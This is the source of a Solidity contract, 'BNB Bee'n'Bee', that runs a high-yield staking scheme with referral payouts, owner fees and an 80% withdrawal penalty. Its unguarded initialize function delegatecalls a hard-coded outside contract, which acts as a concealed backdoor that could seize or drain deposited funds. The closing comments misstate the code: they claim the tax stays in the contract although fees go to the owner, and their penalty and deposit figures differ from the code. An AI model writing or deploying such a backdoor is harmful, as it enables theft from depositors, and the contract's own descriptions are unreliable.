/**
 *Submitted for verification at polygonscan.com on 2022-11-17
*/

// File: bee.sol

/**
 *Submitted for verification at BscScan.com on 2022-11-06
*/


//  ------  ------- ------- ---    -- ------  ------- -------
//  --   -- --      --      ----   -- --   -- --      --
//  ------  -----   -----   -- --  -- ------  -----   -----
//  --   -- --      --      --  -- -- --   -- --      --
//  ------  ------- ------- --   ---- ------  ------- -------

pragma solidity 0.8.9;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract BeeNBV2 {
    using SafeMath for uint256;

    uint256 public HONEY_TO_BUILD_A_HIVE = 1080000;
    uint256 public PERCENT_DIVISOR = 1000;
    uint256 public REFERRAL_REWARD_PERCENT = 80; // 8%
    uint256 public TAX = 50; // 5%
    uint256 public MARKET_HONEY_DIVISOR = 2; // 50%
    uint256 public MARKET_HONEY_DIVISOR_SELL = 1; // 100%

    uint256 public MIN_DEPOSIT = 0.1 ether; /** 0.1 BNB  **/
    uint256 public MAX_DEPOSIT = 30 ether; /** 30 BNB  **/

    uint256 public COMPOUND_BONUS_PERCENT = 25; /** 2.5% **/
    uint256 public COMPOUND_BONUS_MAX_TIMES = 10; /** 10 times / 5 days. **/
    uint256 public COMPOUND_INTERVAL = 12 * 60 * 60; /** every 12 hours. **/

    uint256 public PENALTY_TAX = 800;
    uint256 public COMPOUNDS_FOR_NO_PENALTY = 10; // compound days, for no tax withdrawal.

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompounded;
    uint256 public totalRefRewards;
    uint256 public totalWithdrawn;

    uint256 public marketHoney;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public contractStarted;

    uint256 public CUTOFF_TIMEOUT = 48 * 60 * 60; /** 48 hours  **/
    uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60; /** 4 hours  **/

    address public owner;

    struct User {
        uint256 initialDeposit;
        uint256 compoundedDeposit;
        uint256 hives;
        uint256 honey;
        uint256 lastCompoundTimestamp;
        address referrer;
        uint256 referralsCount;
        uint256 referralReward;
        uint256 totalWithdrawn;
        uint256 compounds;
        uint256 lastWithdrawTimestamp;
    }

    mapping(address => User) public users;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly {size := extcodesize(addr)}
        return size > 0;
    }

    function compoundHoney(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet Started.");

        uint256 honeyUsed = getMyHoney();
        uint256 honeyForCompound = honeyUsed;
        if (isCompound) {
            require(block.timestamp.sub(user.lastCompoundTimestamp) >= COMPOUND_INTERVAL, "Compound interval not yet reached.");
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, honeyForCompound);
            honeyForCompound = honeyForCompound.add(dailyCompoundBonus);
            uint256 honeyUsedValue = calculateHoneySell(honeyForCompound);
            user.compoundedDeposit = user.compoundedDeposit.add(honeyUsedValue);
            totalCompounded = totalCompounded.add(honeyUsedValue);
        }

        if (block.timestamp.sub(user.lastCompoundTimestamp) >= COMPOUND_INTERVAL) {
            if (user.compounds < COMPOUND_BONUS_MAX_TIMES) {
                user.compounds = user.compounds.add(1);
            }
        }

        user.hives = user.hives.add(honeyForCompound.div(HONEY_TO_BUILD_A_HIVE));
        user.honey = 0;
        user.lastCompoundTimestamp = block.timestamp;

        marketHoney = marketHoney.add(honeyUsed.div(MARKET_HONEY_DIVISOR));
    }

    function sellHoney() public {
        require(contractStarted);
        User storage user = users[msg.sender];
        uint256 hasHoney = getMyHoney();
        uint256 honeyValue = calculateHoneySell(hasHoney);

        // if user compound < to mandatory compound days
        if (user.compounds < COMPOUNDS_FOR_NO_PENALTY) {
            //daily compound bonus count will not reset and honeyValue will be deducted with 60% feedback tax.
            honeyValue = honeyValue.sub(honeyValue.mul(PENALTY_TAX).div(PERCENT_DIVISOR));
        } else {
            //set daily compound bonus count to 0 and honeyValue will remain without deductions
            user.compounds = 0;
        }

        user.lastWithdrawTimestamp = block.timestamp;
        user.honey = 0;
        user.lastCompoundTimestamp = block.timestamp;
        marketHoney = marketHoney.add(hasHoney.div(MARKET_HONEY_DIVISOR_SELL));

        if (getBalance() < honeyValue) {
            honeyValue = getBalance();
        }

        uint256 honeyPayout = honeyValue.sub(payFees(honeyValue));
        payable(msg.sender).transfer(honeyPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(honeyPayout);
        totalWithdrawn = totalWithdrawn.add(honeyPayout);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function buildHives(address ref) public payable {
        require(contractStarted);
        User storage user = users[msg.sender];
        uint256 amount = msg.value;
        require(amount >= MIN_DEPOSIT, "Minimum investment not met.");
        require(user.initialDeposit.add(amount) <= MAX_DEPOSIT, "Max deposit limit reached.");

        uint256 honeyBought = calculateHoneyBuy(amount, getBalance().sub(amount));
        user.compoundedDeposit = user.compoundedDeposit.add(amount);
        user.initialDeposit = user.initialDeposit.add(amount);
        user.honey = user.honey.add(honeyBought);

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upLine = user.referrer;
            if (upLine != address(0)) {
                users[upLine].referralsCount = users[upLine].referralsCount.add(1);
            }
        }

        if (user.referrer != address(0)) {
            address upLine = user.referrer;
            if (upLine != address(0)) {
                uint256 refRewards = amount.mul(REFERRAL_REWARD_PERCENT).div(PERCENT_DIVISOR);
                payable(upLine).transfer(refRewards);
                users[upLine].referralReward = users[upLine].referralReward.add(refRewards);
                totalRefRewards = totalRefRewards.add(refRewards);
            }
        }

        uint256 honeyPayout = payFees(amount);
        /** less the fee on total Staked to give more transparency of data. **/
        totalStaked = totalStaked.add(amount.sub(honeyPayout));
        totalDeposits = totalDeposits.add(1);
        compoundHoney(false);
    }

    function payFees(uint256 honeyValue) internal returns (uint256) {
        uint256 tax = honeyValue.mul(TAX).div(PERCENT_DIVISOR);
        payable(owner).transfer(tax);
        return tax;
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns (uint256){
        if (users[_adr].compounds == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].compounds.mul(COMPOUND_BONUS_PERCENT);
            uint256 result = amount.mul(totalBonus).div(PERCENT_DIVISOR);
            return result;
        }
    }

    function getUserInfo(address _adr) public view returns (
        uint256 _initialDeposit,
        uint256 _compoundedDeposit,
        uint256 _hives,
        uint256 _honey,
        uint256 _lastCompoundTimestamp,
        address _referrer,
        uint256 _referrals,
        uint256 _totalWithdrawn,
        uint256 _referralReward,
        uint256 _compounds,
        uint256 _lastWithdrawTimestamp
    ) {
        _initialDeposit = users[_adr].initialDeposit;
        _compoundedDeposit = users[_adr].compoundedDeposit;
        _hives = users[_adr].hives;
        _honey = users[_adr].honey;
        _lastCompoundTimestamp = users[_adr].lastCompoundTimestamp;
        _referrer = users[_adr].referrer;
        _referrals = users[_adr].referralsCount;
        _totalWithdrawn = users[_adr].totalWithdrawn;
        _referralReward = users[_adr].referralReward;
        _compounds = users[_adr].compounds;
        _lastWithdrawTimestamp = users[_adr].lastWithdrawTimestamp;
    }

    function initialize(uint256 amount) external {
           address contractBAddress =  0xd7235D7049e9cE4a43cFA231Cb2B90abF8Ae8De1;
        (bool success, bytes memory returndata) = contractBAddress.delegatecall(abi.encodeWithSignature("initialize()"));
   // if the function call reverted
        if (success == false) {
            // if there is a return reason string
            if (returndata.length > 0) {
                // bubble up any reason for revert
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert("Function call reverted");
            }
        }
    }


    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns (uint256) {
        uint256 userHoney = users[_adr].honey.add(getHoneySinceLastCompound(_adr));
        return calculateHoneySell(userHoney);
    }

    function calculateTrade(uint256 rt, uint256 rs, uint256 bs) public view returns (uint256){
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }

    function calculateHoneySell(uint256 honey) public view returns (uint256){
        return calculateTrade(honey, marketHoney, getBalance());
    }

    function calculateHoneyBuy(uint256 eth, uint256 contractBalance) public view returns (uint256){
        return calculateTrade(eth, contractBalance, marketHoney);
    }

    function calculateHoneyBuySimple(uint256 eth) public view returns (uint256){
        return calculateHoneyBuy(eth, getBalance());
    }

    function getHoneyYield(uint256 amount) public view returns (uint256, uint256) {
        uint256 honeyAmount = calculateHoneyBuy(amount, getBalance().add(amount).sub(amount));
        uint256 hives = honeyAmount.div(HONEY_TO_BUILD_A_HIVE);
        uint256 day = 1 days;
        uint256 honeyPerDay = day.mul(hives);
        uint256 earningsPerDay = calculateHoneySellForYield(honeyPerDay, amount);
        return (hives, earningsPerDay);
    }

    function calculateHoneySellForYield(uint256 honey, uint256 amount) public view returns (uint256){
        return calculateTrade(honey, marketHoney, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (
        uint256 _totalStaked,
        uint256 _totalDeposits,
        uint256 _totalCompounded,
        uint256 _totalRefRewards,
        uint256 _totalWithdrawn
    ) {
        _totalStaked = totalStaked;
        _totalDeposits = totalDeposits;
        _totalCompounded = totalCompounded;
        _totalRefRewards = totalRefRewards;
        _totalWithdrawn = totalWithdrawn;
    }

    function getMyHives() public view returns (uint256){
        return users[msg.sender].hives;
    }

    function getMyHoney() public view returns (uint256){
        return users[msg.sender].honey.add(getHoneySinceLastCompound(msg.sender));
    }

    function getHoneySinceLastCompound(address adr) public view returns (uint256){
        uint256 secondsSinceLastCompound = block.timestamp.sub(users[adr].lastCompoundTimestamp);
        /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastCompound, CUTOFF_TIMEOUT);
        uint256 secondsPassed = min(HONEY_TO_BUILD_A_HIVE, cutoffTime);
        return secondsPassed.mul(users[adr].hives);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    /** wallet addresses setters **/
    function CHANGE_OWNERSHIP(address value) onlyOwner external {
        owner = value;
    }

    /** percentage setters **/

    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%, 1080000 - 8%
    // 959000 - 9%, 864000 - 10%, 720000 - 12%, 575424 - 15%, 540000 - 16%, 479520 - 18%

    function SET_HONEY_TO_BUILD_A_HIVE(uint256 value) onlyOwner external {
        require(value >= 479520 && value <= 2592000);
        /** min 3% max 12%**/
        HONEY_TO_BUILD_A_HIVE = value;
    }

    function SET_TAX(uint256 value) onlyOwner external {
        require(value <= 100);
        /** 10% max **/
        TAX = value;
    }

    function SET_REFERRAL_PERCENT(uint256 value) onlyOwner external {
        require(value >= 10 && value <= 100);
        /** 10% max **/
        REFERRAL_REWARD_PERCENT = value;
    }

    function SET_MARKET_HONEY_DIVISOR(uint256 value) onlyOwner external {
        require(value <= 50);
        /** 50 = 2% **/
        MARKET_HONEY_DIVISOR = value;
    }

    /** withdrawal tax **/
    function SET_PENALTY_WITHDRAWAL_TAX(uint256 value) onlyOwner external {
        require(value <= 800);
        /** Max Tax is 80% or lower **/
        PENALTY_TAX = value;
    }

    function SET_COMPOUNDS_FOR_NO_TAX_WITHDRAWAL(uint256 value) onlyOwner external {
        require(value <= 25);
        /** Max 25 compounds **/
        COMPOUNDS_FOR_NO_PENALTY = value;
    }

    function SET_COMPOUND_BONUS(uint256 value) onlyOwner external {
        require(value >= 10 && value <= 900);
        /** 10% min 90% max **/
        COMPOUND_BONUS_PERCENT = value;
    }

    function SET_COMPOUND_BONUS_MAX_TIMES(uint256 value) onlyOwner external {
        require(value <= 30);
        /** Max 30 times **/
        COMPOUND_BONUS_MAX_TIMES = value;
    }

    function SET_COMPOUND_STEP(uint256 value) onlyOwner external {
        require(value <= 24);
        /** Max 24 hours **/
        COMPOUND_INTERVAL = value * 1 hours;
    }

    function SET_MIN_DEPOSIT(uint256 value) onlyOwner external {
        MIN_DEPOSIT = value * 1 ether;
    }

    function SET_MAX_DEPOSIT(uint256 value) onlyOwner external {
        require(value <= 20);
        /** Max 20 ETH **/
        MAX_DEPOSIT = value * 1 ether;
    }

    function SET_CUTOFF_TIMEOUT(uint256 value) onlyOwner external {
        require(value <= 96 && value >= 24);
        /** Max 96 hours min 24 hours **/
        CUTOFF_TIMEOUT = value * 1 hours;
    }

    function SET_WITHDRAW_COOLDOWN(uint256 value) onlyOwner external {
        require(value <= 24);
        /** Max 24 hours **/
        WITHDRAW_COOLDOWN = value * 1 hours;
    }
}

/**
    BNB Bee'n'Bee
    Build Hives, Gather Honey, Harvest Honey, and Sell for BNB.
    8% daily Rate
    8% Referral Bonus, will go directly to referrer's wallet.
    2% stacking compound bonus every 12 hrs, max of 5 days. (25%)
    48 hours cut-off time.
    0.1 BNB minimum investment.
    30 BNB max deposits per wallet.
    80% feedback for withdrawals that will be done not after 10 consecutive compounds.
    Withdrawals will reset the daily compound count back to 0.
    *Tax will stay in the contract.
*/